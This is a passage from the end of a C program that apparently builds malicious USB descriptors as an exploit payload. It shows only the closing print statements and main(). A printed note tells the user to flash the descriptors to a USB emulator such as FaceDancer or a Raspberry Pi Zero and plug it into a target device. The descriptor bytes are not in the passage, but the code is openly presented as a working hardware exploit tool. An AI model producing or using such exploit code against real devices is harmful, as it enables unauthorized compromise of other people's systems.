    printf("\n");

    printf("[+] Payload generated successfully.\n");
    printf("[*] Note: To execute this exploit, flash these descriptors to a USB emulator (e.g., FaceDancer or Raspberry Pi Zero) and connect it to the target device.\n");
}

int main(int argc, char *argv[]) {
    generate_malicious_descriptor();
    return 0;
}

